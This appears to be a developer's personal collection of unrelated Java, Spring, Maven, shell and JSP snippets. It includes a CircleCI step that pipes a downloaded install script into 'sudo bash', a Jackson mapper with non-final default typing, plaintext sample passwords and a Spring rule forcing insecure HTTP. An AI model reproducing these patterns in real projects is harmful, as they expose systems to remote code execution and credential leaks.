            ,RedirectAttributes redirectAttributes){
         if(result.hasErrors()) {
                return new ModelAndView("candidateDetailsAdd");
         }
         myCandidate.setDate(new Date());
         candidateService.add(myCandidate);
         redirectAttributes.addAttribute("message", "added Correctly");
         redirectAttributes.addAttribute("id",myCandidate.getId());
         ModelAndView modelAndView = new ModelAndView("redirect:loadCandidateById");
            //return "candidateMenu";
        return modelAndView;
        // return "candidateMenu";
    }

}

class SkillDTO {

    private List<Integer> skills;

    public List<Integer> getSkills() {
        return skills;
    }

    public void setSkills(List<Integer> skills) {
        this.skills = skills;
    }
}
java -jar proguard.jar ..... -obfuscationdictionary compact.txt
--------------------------------------------------------------------------------------------------------
spring.data.redis.repositories.enabled = false

https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#repositories.multiple-modules
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableJpaRepositories
@EnableTransactionManagement
class ApplicationConfig {

  @Bean
  public DataSource dataSource() {

    EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
    return builder.setType(EmbeddedDatabaseType.HSQL).build();
  }

  @Bean
  public LocalContainerEntityManagerFactoryBean entityManagerFactory() {

    HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
    vendorAdapter.setGenerateDdl(true);

    LocalContainerEntityManagerFactoryBean factory = new LocalContainerEntityManagerFactoryBean();
    factory.setJpaVendorAdapter(vendorAdapter);
    factory.setPackagesToScan("com.acme.domain");
    factory.setDataSource(dataSource());
    return factory;
  }

  @Bean
  public PlatformTransactionManager transactionManager(EntityManagerFactory entityManagerFactory) {

    JpaTransactionManager txManager = new JpaTransactionManager();
    txManager.setEntityManagerFactory(entityManagerFactory);
    return txManager;
  }
}
--------------------------------------------------------------------------------------------------------
touch /volumes/boot/ssh

wpa_supplicant.conf
country=US
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network = {
	ssid = ""
	psk = ""
}

git clone https://github.com/respeaker/seeed-voicecard
cd seeed-voicecard
sudo ./install.sh
sudo reboot
aplay -l
arecord -l

sudo apt-get update
sudo apt-get install python3-dev python3-venv
python3 -m venv env
env/bin/python -m pip install --upgrade pip setuptools wheel
source /env/bin/activate

python -m pip install --upgrade google-assistant-library
--------------------------------------------------------------------------------------------------------
@Retry(maxRetries = 2)
@CircuitBreaker
--------------------------------------------------------------------------------------------------------
public class CompanyObjectMapper extends ObjectMapper {
    public CompanyObjectMapper() {
        super();
        setVisibilityChecker(getSerializationConfig()
                .getDefaultVisibilityChecker()
                .withCreatorVisibility(JsonAutoDetect.Visibility.NONE)
                .withFieldVisibility(JsonAutoDetect.Visibility.NONE)
                .withGetterVisibility(JsonAutoDetect.Visibility.NONE)
                .withIsGetterVisibility(JsonAutoDetect.Visibility.NONE)
                .withSetterVisibility(JsonAutoDetect.Visibility.DEFAULT));
    }
}
--------------------------------------------------------------------------------------------------------
spring.jackson.deserialization.<feature_name>=true|false
spring.jackson.generator.<feature_name>=true|false
spring.jackson.mapper.<feature_name>=true|false
spring.jackson.parser.<feature_name>=true|false
spring.jackson.serialization.<feature_name>=true|false
spring.jackson.default-property-inclusion=always|non_null|non_absent|non_default|non_empty

@Bean
public Jackson2ObjectMapperBuilder jacksonBuilder() {
    Jackson2ObjectMapperBuilder builder = new Jackson2ObjectMapperBuilder();
    builder.indentOutput(true).dateFormat(new SimpleDateFormat("yyyy-MM-dd"));
    return builder;
}
--------------------------------------------------------------------------------------------------------
public class SpringDataRestCustomization implements RepositoryRestConfigurer {
    @Override
    public void configureRepositoryRestConfiguration(RepositoryRestConfiguration config) {
        config.withEntityLookup()
        .forRepository(UserRepo.class, User::getUsername, UserRepo::findByUsername);
    }
}

@RepositoryRestResource(exported = true)
public interface UserRepo extends PagingAndSortingRepository<User, Long> {
    Optional<User> findByUsername(String username);
}
--------------------------------------------------------------------------------------------------------
@Override
public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
    ObjectMapper objectMapper = Jackson2ObjectMapperBuilder.json().modules(new JavaTimeModule(), new Jdk8Module()).build()
            .configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);
    converters.add(new MappingJackson2HttpMessageConverter(objectMapper));
}
--------------------------------------------------------------------------------------------------------
public interface UserRepository extends JpaRepository<User, Long> {

  @Query(value = "SELECT * FROM USERS WHERE LASTNAME = ?1",
    countQuery = "SELECT count(*) FROM USERS WHERE LASTNAME = ?1",
    nativeQuery = true)
  Page<User> findByLastname(String lastname, Pageable pageable);
}
--------------------------------------------------------------------------------------------------------
sudo gattool install
wsimport src/main/resources/wsdl/simple-ws.wsdl -s src/main/gen -Xnocompile
--------------------------------------------------------------------------------------------------------
@Component
public class CustomDateSerializer extends StdSerializer<Ticket> {
    private final ObjectMapper om;

    public CustomDateSerializer() {
        super(Ticket.class);
        this.om = new ObjectMapper().enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
    }

    @Override
    public void serialize(final Ticket value, JsonGenerator gen, SerializerProvider arg2) throws IOException {
        gen.writeBinary(this.om.writeValueAsBytes(value));
    }

//    @Override
//    public Ticket deserialize(final byte[] bytes) throws SerializationException {
//        if (bytes == null) {
//            return null;
//        }
//        try {
//            return om.readValue(bytes, Ticket.class);
//        } catch (Exception e) {
//            throw new SerializationException(e.getMessage(), e);
//        }
//    }
}
--------------------------------------------------------------------------------------------------------
//        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
//        ObjectMapper objectMapper = new ObjectMapper();
//        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
//        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);
//        redisTemplate.setValueSerializer(jackson2JsonRedisSerializer);
--------------------------------------------------------------------------------------------------------
@Bean
	@Scope(value="thread", proxyMode = ScopedProxyMode.TARGET_CLASS)
	public CacheManager threadCaches() {
		log.debug("Creating a new thread cache");
		SimpleCacheManager cache = new SimpleCacheManager();
		cache.setCaches(singleton(new ConcurrentMapCache("countries")));
		return cache;
	}
	
	@Bean
	@Primary
	public CacheManager mainCacheManager() {
		return new CompositeCacheManager(threadCaches());
	}
--------------------------------------------------------------------------------------------------------
@JsonTypeInfo(
	user = JsonTypeInfo.Id.NAME,
	include = As.PROPERTY,
	property = "type"
)
@JsonSubTypes(
	{
		@JsonSubTypes.Type(value = Gateway.class, name = "gateway")
		@JsonSubTypes.Type(value = Sensor.class, name = "sensor")
	}
)
public class Device {

}

@JsonTypeName("gateway")
public class Gateway extends Device {
	public string sn;
}
@JsonTypeName("sensor")
public class Sensor extends Device {
	public String gatewaySN;
	public int channel;
}
--------------------------------------------------------------------------------------------------------
class MyRepositoryImpl<T, ID extends Serializable>
  extends SimpleJpaRepository<T, ID> {

  private final EntityManager entityManager;

  MyRepositoryImpl(JpaEntityInformation entityInformation,
                          EntityManager entityManager) {
    super(entityInformation, entityManager);

    // Keep the EntityManager around to used from the newly introduced methods.
    this.entityManager = entityManager;
  }

  @Transactional
  public <S extends T> S save(S entity) {
    // implementation goes here
  }
}
--------------------------------------------------------------------------------------------------------
# mysql
spring.datasource.url=jdbc:mysql://localhost:3306/mytest?useSSL=false&useUnicode=true&characterEncoding=utf-8&zeroDateTimeBehavior=convertToNull
spring.datasource.username=root
spring.datasource.password=root123

spring.datasource.driver-class-name=com.mysql.jdbc.Driver
spring.datasource.hikari.connection-timeout=3000
spring.datasource.hikari.initialization-fail-fast=true
spring.datasource.hikari.max-lifetime=600000
spring.datasource.hikari.maximum-pool-size=20
spring.datasource.hikari.minimum-idle=20000
spring.datasource.hikari.idle-timeout=300000
spring.datasource.hikari.initialization=true


spring.jpa.database=mysql
spring.jpa.database-platform=org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.dialect=org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.transaction.rollback-on-commit-failure=true

# redis
spring.redis.database=0
spring.redis.host=localhost
spring.redis.password=redis
spring.redis.port=6379

spring.redis.pool.maxActive=8
spring.redis.pool.maxWait=-1
spring.redis.pool.maxIdle=8
spring.redis.pool.minIdle=0
spring.redis.timeout=2000
--------------------------------------------------------------------------------------------------------
@Repository
@EnableScan
public interface ServiceItemRepository extends CrudRepository<ServiceItem, String> {
}

@Data
@DynamoDBTable(tableName = "tableName")
public class entityName implements Serializable {

    private static final long serialVersionUID = 1L;

    @Id
    @DynamoDBHashKey
    @DynamoDBAutoGeneratedKey
    private String id;

    @DynamoDBRangeKey
    private String rk;

    private String sy;
}
--------------------------------------------------------------------------------------------------------
    @Bean
    public KeyValueOperations keyValueTemplate() {
        return new KeyValueTemplate(keyValueAdapter());
    }

    @Bean
    public KeyValueAdapter keyValueAdapter() {
        return new MapKeyValueAdapter(WeakHashMap.class);
    }
--------------------------------------------------------------------------------------------------------
@Accessors(fluent = true)
--------------------------------------------------------------------------------------------------------
om.fasterxml.jackson.databind.JsonMappingException: Problem deserializing property 'id' (expected type: [simple type, class java.lang.String]; actual type: `java.util.UUID`), problem: argument type mismatch

@Data
@RequiredArgsConstructor(onConstructor = @__(@PersistenceConstructor))
@Document
public class Order {

	private final String id;
	private final String customerId;
	private final Date orderDate;
	private final List<LineItem> items;

	/**
	 * Creates a new {@link Order} for the given customer id and order date.
	 *
	 * @param customerId
	 * @param orderDate
	 */
	public Order(String customerId, Date orderDate) {
		this(null, customerId, orderDate, new ArrayList<LineItem>());
	}

	/**
	 * Adds a {@link LineItem} to the {@link Order}.
	 *
	 * @param item
	 * @return
	 */
	public Order addItem(LineItem item) {

		this.items.add(item);
		return this;
	}
}
--------------------------------------------------------------------------------------------------------
spring.h2.console.enabled=true
spring.h2.console.path=/h2_console
spring.datasource.url=jdbc:h2:file:~/h2/testdb
spring.datasource.username=sa
spring.datasource.password=
spring.datasource.driverClassName=org.h2.Driver
spring.jpa.hibernate.ddl-auto = update
spring.jpa.show-sql=true
--------------------------------------------------------------------------------------------------------
	@Test
	public void bindToValidatedBeanWithResourceAndNonEnumerablePropertySource() {
		ConfigurationPropertySources.from(new PropertySource<String>("test") {
			@Override
			public Object getProperty(String name) {
				return null;
			}
		}).forEach(this.sources::add);
		Validator validator = new SpringValidatorAdapter(Validation.byDefaultProvider()
				.configure().buildValidatorFactory().getValidator());
		this.binder.bind("foo", Bindable.of(ResourceBean.class),
				new ValidationBindHandler(validator));
	}
--------------------------------------------------------------------------------------------------------
version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
    steps:
      - checkout
      - run:
          name: "Update Node.js and npm"
          command: |
            curl -sSL "https://nodejs.org/dist/v11.10.0/node-v11.10.0-linux-x64.tar.xz" | sudo tar --strip-components=2 -xJ -C /usr/local/bin/ node-v11.10.0-linux-x64/bin/node
            curl https://www.npmjs.com/install.sh | sudo bash
      - run:
          name: Check current version of node
          command: node -v
--------------------------------------------------------------------------------------------------------
  <licenses>
     <license>
        <name>Lesser General Public License (LGPL) version 3.0</name>
        <url>https://www.gnu.org/licenses/lgpl-3.0.txt</url>
     </license>
     <license>
        <name>Apache Software License (ASL) version 2.0</name>
        <url>http://www.apache.org/licenses/LICENSE-2.0.txt</url>
     </license>
  </licenses>
--------------------------------------------------------------------------------------------------------
mvn help:effective-settings:
mvn deploy -e

curl -u username:password http://url/artifactory/libs-snapshot-local/com/myproject/api/1.0-SNAPSHOT/api-1.0-20160128.114425-1.jar --request PUT --data target/api-1.0-SNAPSHOT.jar
--------------------------------------------------------------------------------------------------------
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page session="false"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>

<!-- Begin Body -->
<div class="container">
	<div class="row">
		<div class="span12">
			<h2>簡單計算機</h2>
<table>
    <tr>
        <td colspan="5"><input type="text" readonly="readonly" id="_result" value="0" style="text-align:right;width:95%" /></td>
    </tr>
    <tr>
        <td><button id="_1" onclick="javascript: addNumber('1');">1</button></td>
        <td><button id="_2" onclick="javascript: addNumber('2');">2</button></td>
        <td><button id="_3" onclick="javascript: addNumber('3');">3</button></td>
        <td colspan="2"><button id="_C" style="width:85%">C</button></td>
    </tr>
    <tr>
        <td><button id="_4" onclick="javascript: addNumber('4');">4</button></td>
        <td><button id="_5" onclick="javascript: addNumber('5');">5</button></td>
        <td><button id="_6" onclick="javascript: addNumber('6');">6</button></td>
        <td><button id="_Plus" onclick="javascript: addOperator('+');">+</button></td>
        <td><button id="_Minus" onclick="javascript: addOperator('-');">-</button></td>
    </tr>
    <tr>
        <td><button id="_7" onclick="javascript: addNumber('7');">7</button></td>
        <td><button id="_8" onclick="javascript: addNumber('8');">8</button></td>
        <td><button id="_9" onclick="javascript: addNumber('9');">9</button></td>
        <td><button id="_Multiple" onclick="javascript: addOperator('*');">X</button></td>
        <td><button id="_Divide" onclick="javascript: addOperator('/');">/</button></td>
    </tr>
    <tr>
        <td colspan="2"><button id="_0" style="width:90%" onclick="javascript: addNumber('0');">0</button></td>
        <td colspan="2"><button id="_Undo" style="width:90%" onclick="javascript: undo();">Undo</button></td>
        <td colspan="2"><button id="_Equal" style="width:85%" onclick="javascript: compute();">=</button></td>
    </tr>

</table>
<input type="hidden" id="operand" value="0"/>
<input type="hidden" id="isReset" value="true"/>
<input type="hidden" id="operator" value="+"/>
		</div>
	</div>
</div>

    <script>
        function addNumber(number) {
            var currentVal = parseInt($("#_result").val(), 10);
            var isReset = $("#isReset").val();
            if (isReset == "true") {
                currentVal = 0;
            }
            var intVal = parseInt(number, 10);
            currentVal = currentVal * 10 + intVal;
            $("#isReset").val("false");
            $("#_result").val(currentVal);
        }
        function addOperator(operator) {
            var currentVal = parseInt($("#_result").val(), 10);
            $("#operand").val(currentVal);
            if ($("#operator").val() != "")
                compute();
            $("#operator").val(operator);
            $("#isReset").val("true");
        }
        function compute() {
            var operand = $("#operand").val();
            var operator = $("#operator").val();
            var inputdata = { operand: operand, operator: operator };
            $.ajax({
                type: 'GET',
                url: '${pageContext.request.contextPath }/cmd/cmpt',
                datatype: 'application/json',
                data: inputdata,
                async: false,
                success: function (data) {
                    $("#_result").val(data);
                }
            });
        }
        function undo() {
            $.ajax({
                type: 'GET',
                url: '${pageContext.request.contextPath }/cmd/undo',
                datatype: 'application/json',
                async: false,
                success: function (data) {
                    $("#_result").val(data);
                }
            });
        }
        $("#_C").click(function () {
            var inputdata = {};
            $.ajax({
                type: 'GET',
                url: '${pageContext.request.contextPath }/cmd/clr',
                datatype: 'application/json',
                data: inputdata,
                async: false,
                success: function (data) {
                    $("#_result").val(data);
                    $("#isReset").val("true");
                    $("#operator").val("+");
                    $("#operand").val("0");
                }
            });
        });
    </script>
--------------------------------------------------------------------------------------------------------
FROM java:8
VOLUME /tmp
ADD slackbot-0.0.1-SNAPSHOT.jar app.jar
RUN bash -c 'touch /app.jar'
EXPOSE 9119
ENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","/app.jar"]
--------------------------------------------------------------------------------------------------------
import com.ruubel.model.Bank
import com.ruubel.model.BankInformation
import com.ruubel.service.factory.ScraperFactoryService
import com.ruubel.service.observer.BankInformationPublisherService
import com.ruubel.service.strategy.BankScraperStrategy
import spock.lang.Specification

class BankServiceSpec extends Specification {

    BankService service
    BankInformationPublisherService bankInformationPublisherService
    ScraperFactoryService scraperFactoryService

    def setup() {
        bankInformationPublisherService = Mock(BankInformationPublisherService)
        scraperFactoryService = Mock(ScraperFactoryService)
        service = new BankService(bankInformationPublisherService, scraperFactoryService)
    }

    def "when empty list of strategies is defined, then scrapes none, publishes and returns empty list" () {
        when:
            List<BankInformation> contacts = service.getContacts()
        then:
            1 * service.scraperFactoryService.getStrategies() >> []
            1 * bankInformationPublisherService.publish([])
            contacts == []
    }

    def "when strategy is defined, then scrapes it, publishes and returns on element list" () {
        given:
            BankScraperStrategy scraper = Mock(BankScraperStrategy)
            BankInformation scrapeResult = new BankInformation(Bank.SEB, "12345")
        when:
            List<BankInformation> contacts = service.getContacts()
        then:
            1 * scraperFactoryService.getStrategies() >> [scraper]
            1 * scraper.scrape() >> scrapeResult
            1 * bankInformationPublisherService.publish([scrapeResult])
            contacts == [scrapeResult]
    }

}
--------------------------------------------------------------------------------------------------------
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;

/**
 * A wrapper service for testing purposes
 */
public class HttpFetchService {

    public Document get(String url) throws IOException {
        return Jsoup.connect(url).get();
    }
}
--------------------------------------------------------------------------------------------------------
	@Override
	public BankInformation scrape() {
		String number = "FAILED";
		try {
			Document doc = httpFetchService.get(bankUrl);

			Elements content = doc.select(".field-type-text-with-summary");
			Elements tables = content.get(0).select("table");
			Elements tds = tables.get(0).select("td");
			number = tds.get(3).text();
		} catch (Exception e) {
			e.printStackTrace();
		}

		return new BankInformation(Bank.SEB, number);
	}
--------------------------------------------------------------------------------------------------------
    public void sort(int[] arr)
    {
        int size=arr.length; 
        for (int i=1;i<size;i++) // starting from index no 1 because it assumes first index as sorted
        {
            int t=i-1;
            int temp=arr[i];
            for (;t>=0&&arr[t]>temp;t--) 
                {
                    arr[t+1]=arr[t];
                }
            arr[t+1]=temp;
        }
    }
--------------------------------------------------------------------------------------------------------
PRAGMA foreign_keys = "1";
SELECT type,name,sql,tbl_name,'0' AS temp FROM sqlite_master UNION SELECT type,name,sql,tbl_name,'1' AS temp FROM sqlite_temp_master;
PRAGMA encoding
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
--------------------------------------------------------------------------------------------------------
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Properties;

public class LoggerUtils {

    static {
        configuration();
    }

    private static void configuration() {
        Properties props = new Properties();
        try {
            props.load(
                new BufferedReader(
                    new InputStreamReader(
                        LoggerUtils.class.getResourceAsStream("/log4jstructuraldp.properties")
                    )
                )
            );
        } catch (IOException e) {
            System.out.println("log4jstructuraldp.properties file not configured properly");
            System.exit(0);
        }
        PropertyConfigurator.configure(props);
    }
}
--------------------------------------------------------------------------------------------------------
keytool -genkey -alias tomcat -keyalg RSA -storepass changeit -keypass changeit -dname 'CN=tomcat'

<Connector port="8080" protocol="HTTP/1.1"
   connectionTimeout="20000"
   redirectPort="8443" />
 
<Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol"
   maxThreads="150" SSLEnabled="true" scheme="https" secure="true"
   clientAuth="false" sslProtocol="TLS"
   keystoreFile="${user.home}/.keystore" keystorePass="changeit" />
   
http.requiresChannel()
  .anyRequest().requiresInsecure();
--------------------------------------------------------------------------------------------------------
<pluginGroup>org.sonatype.plugins</pluginGroup>

mvn nexus-staging:rc-list
mvn nexus-staging:rc-close -DserverId=nexus -
DnexusUrl=http://localhost:8081/nexus

mvn nexus-staging:rc-promote -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DbuildPromotionProfileId=foo -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I promote these is..."
mvn nexus-staging:rc-release -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I release these is..."
mvn nexus-staging:rc-drop -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I drop these is..."
mvn nexus-staging:rc-close -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I close these is..."
--------------------------------------------------------------------------------------------------------
@RequestMapping(method = RequestMethod.GET, value = "/report")
	public List<Employee> EmployeeReport() throws ServletException, IOException {
		// Lets say this method gets all EmployeeDetails First
		System.out.println("Starting");
		List<Employee> empList = new EmployeeService().getEmployees();

		Runnable myrunLambda = () -> {
			// Say there is a ReportUtil which takes the list data, does some calculations
			// and dumps the report at a specific location
			String reportPath = ReportUtil.generateReport();
			// Finally say we have an email service which picks the report and send to
			// admin.
			EmailUtil.sendReport(reportPath);

		};
		new Thread(myrunLambda).start();
		System.out.println("Ending");
		// Finally return the employee's count
		return null;
	}
--------------------------------------------------------------------------------------------------------
skipNexusStagingDeployMojo

<settings>
  <mirrors>
    <mirror>
      <!--This sends everything else to /public -->
      <id>nexus</id>
      <mirrorOf>*</mirrorOf>
      <url>http://localhost:8081/nexus/content/groups/public</url>
    </mirror>
  </mirrors>
  <profiles>
    <profile>
      <id>nexus</id>
      <!--Enable snapshots for the built in central repo to direct -->
      <!--all requests to nexus via the mirror -->
      <repositories>
        <repository>
          <id>central</id>
          <url>http://central</url>
          <releases><enabled>true</enabled></releases>
          <snapshots><enabled>true</enabled></snapshots>
        </repository>
      </repositories>
     <pluginRepositories>
        <pluginRepository>
          <id>central</id>
          <url>http://central</url>
          <releases><enabled>true</enabled></releases>
          <snapshots><enabled>true</enabled></snapshots>
        </pluginRepository>
      </pluginRepositories>
    </profile>
  </profiles>
  <activeProfiles>
    <!--make the profile active all the time -->
    <activeProfile>nexus</activeProfile>
  </activeProfiles>
</settings>
--------------------------------------------------------------------------------------------------------
import android.content.Context;
import android.support.test.InstrumentationRegistry;
import android.support.test.runner.AndroidJUnit4;

import org.junit.Test;
import org.junit.runner.RunWith;

import static org.junit.Assert.*;

/**
 * Instrumentation test, which will execute on an Android device.
 *
 * @see <a href="http://d.android.com/tools/testing">Testing documentation</a>
 */
@RunWith(AndroidJUnit4.class)
public class ExampleInstrumentedTest {
    @Test
    public void useAppContext() throws Exception {
        // Context of the app under test.
        Context appContext = InstrumentationRegistry.getTargetContext();

        assertEquals("com.gohool.trymeoriginal.trymeoriginal", appContext.getPackageName());
    }
}
--------------------------------------------------------------------------------------------------------
#lang racket
;;insertion sort implementation
(define (sort lon)
  (cond [(empty? lon) lon]
        [else (insert (first lon) (sort (rest lon)))]))

(define (insert n lon)
  (cond [(empty? lon) (cons n lon)]
        [else
         (if (> n (first lon))
             (cons (first lon) (insert n (rest lon)))
             (cons n lon))]))
--------------------------------------------------------------------------------------------------------
spring.activemq.broker-url=tcp://172.17.42.1:61616
--------------------------------------------------------------------------------------------------------
#!/bin/bash

intro() {
    echo "Thank you for forking CodeZila"
    echo "Please input any names without any special characters"
    echo "For example: 'Insertion Sort' or 'Linked Lists'"
    read -p "What is the name of the algorithm or design you want to implement? " algorithm
    checkInput "$algorithm"    
    pickLanguague "$algorithm"
    printTree "$algorithm" "$language"
    checkDir "$algorithm"
}

# Checks the input to see if it does not have illegal characters
checkInput() {
    # $1 is the string being checked
    if [[ "$1" == *['!'@\$%^\&*()_+]* ]]
    then
      echo "Illegal character used"
      exit
    fi
}

# Asks the user that language they would like to use
pickLanguague() {
    echo "Select the language you want to implement "$1" in?"
    echo "1)  C++"
    echo "2)  C"
    echo "3)  C#"
    echo "4)  Java"
    echo "5)  JavaScript"
    echo "6)  GoLang"
    echo "7)  Python"
    echo "8)  Ruby"
    echo "9)  Other"
    read n
    case $n in 
        1) language='C++';;
        2) language='C';;
        3) language='C#';;
        4) language='Java';;
        5) language='JavaScript';;
        6) language='GoLang';;
        7) language='Python';;
        8) language='Ruby';;
        9) inputLanguage "$1";;
        *) echo "Error" ; exit;;
    esac

    createDir "$1" "$language"
}

inputLanguage() {
    read -p "What language do you want to implement '$1' in? " lang
    checkInput "$lang"
    createDir "$1" "$lang"
    printTree "$1" "$lang"
    checkDir
    exit
}

# Shows the user the created file structure
printTree() {
    echo "$1"
    echo "├── readme.md"
    echo "└── $2"
}

# Creates the file structure
createDir() {
    if [ ! -d "$1" ]
    then
        mkdir "$1"
    fi

    if [ ! -d "$1/$2" ]
    then
        mkdir "$1"/$2
    fi
    createReadme "$1" "$2"
}

createReadme() {
    if [ -e "$1"/"$2"/readme.md ]
    then
        echo "readme file already exists for '$1/$2'"
    else
        read -p "Do you want to create a Readme (y/n)? " response
        case "$response" in
            y|Y ) echo "# $1 implemented in $2" > "$1"/"$2"/readme.md;;
            n|N ) ;;
            * ) echo "Readme not created" ;;
        esac
    fi
}

# Asks the user if they want to keep the files
checkDir() {
    read -p "Is the file structure above correct? (y/n)? " choice
        case "$choice" in 
        y|Y ) echo "Enjoy Coding!";;
        n|N ) echo "Files Deleted"; rm -rf $1 ;;
        * ) echo "invalid - Files not deleted";;
    esac
}

intro
--------------------------------------------------------------------------------------------------------

import java.util.Iterator;
  
public class DinerMenuIterator implements Iterator {
	MenuItem[] list;
	int position = 0;
 
	public DinerMenuIterator(MenuItem[] list) {
		this.list = list;
	}
 
	public Object next() {
		MenuItem menuItem = list[position];
		position = position + 1;
		return menuItem;
	}
 
	public boolean hasNext() {
		if (position >= list.length || list[position] == null) {
			return false;
		} else {
			return true;
		}
	}
  
	public void remove() {
		if (position <= 0) {
			throw new IllegalStateException
				("You can't remove an item until you've done at least one next()");
		}
		if (list[position-1] != null) {
			for (int i = position-1; i < (list.length-1); i++) {
				list[i] = list[i+1];
			}
			list[list.length-1] = null;
		}
	}
}
--------------------------------------------------------------------------------------------------------
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;

public class ApacheHttpClientPost {

    public static void main(String[] args) throws IOException {

        try (CloseableHttpClient client = HttpClientBuilder.create().build()) {

            HttpPost request = new HttpPost("https://httpbin.org/post");
            request.setHeader("User-Agent", "Java client");
            request.setEntity(new StringEntity("My test data"));

            HttpResponse response = client.execute(request);

            BufferedReader bufReader = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));

            StringBuilder builder = new StringBuilder();

            String line;

            while ((line = bufReader.readLine()) != null) {
                builder.append(line);
                builder.append(System.lineSeparator());
            }

            System.out.println(builder);
        }
    }
}

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;

public class ApacheHttpClientGet {

    public static void main(String[] args) throws IOException {

        try (CloseableHttpClient client = HttpClientBuilder.create().build()) {
        
            HttpGet request = new HttpGet("http://www.something.com");
            HttpResponse response = client.execute(request);

            BufferedReader bufReader = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));

            StringBuilder builder = new StringBuilder();

            String line;

            while ((line = bufReader.readLine()) != null) {
                builder.append(line);
                builder.append(System.lineSeparator());
            }

            System.out.println(builder);
        }
    }
}
<dependency>
    <groupId>org.apache.httpcomponents</groupId>
    <artifactId>httpclient</artifactId>
    <version>4.5.4</version>
</dependency>

        <dependency>
            <groupId>com.opencsv</groupId>
            <artifactId>opencsv</artifactId>
            <version>4.1</version>
        </dependency>
import com.opencsv.CSVWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class OpenCSVDatabaseEx {

    public static void main(String[] args) {

        String url = "jdbc:mysql://localhost:3306/testdb?useSsl=false";
        String user = "testuser";
        String password = "test623";

        String fileName = "src/main/resources/cars.csv";
        Path myPath = Paths.get(fileName);

        try (Connection con = DriverManager.getConnection(url, user, password);
                PreparedStatement pst = con.prepareStatement("SELECT * FROM Cars");
                ResultSet rs = pst.executeQuery()) {

            try (CSVWriter writer = new CSVWriter(Files.newBufferedWriter(myPath,
                    StandardCharsets.UTF_8), CSVWriter.DEFAULT_SEPARATOR,
                    CSVWriter.NO_QUOTE_CHARACTER, CSVWriter.NO_ESCAPE_CHARACTER,
                    CSVWriter.DEFAULT_LINE_END)) {

                writer.writeAll(rs, true);
            }

        } catch (SQLException | IOException ex) {
            Logger.getLogger(OpenCSVDatabaseEx.class.getName()).log(
                    Level.SEVERE, ex.getMessage(), ex);
        }
    }
}
import com.opencsv.bean.CsvBindByName;

public class Car {
    
    @CsvBindByName
    private int id;
    
    @CsvBindByName
    private String name;
    
    @CsvBindByName
    private int price;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getPrice() {
        return price;
    }

    public void setPrice(int price) {
        this.price = price;
    }

    @Override
    public String toString() {

        StringBuilder builder = new StringBuilder();
        builder.append("Car{id=").append(id).append(", name=")
                .append(name).append(", price=").append(price).append("}");

        return builder.toString();
    }
}
import com.opencsv.bean.CsvToBean;
import com.opencsv.bean.CsvToBeanBuilder;
import com.opencsv.bean.HeaderColumnNameMappingStrategy;
import com.zetcode.bean.Car;
import java.io.BufferedReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
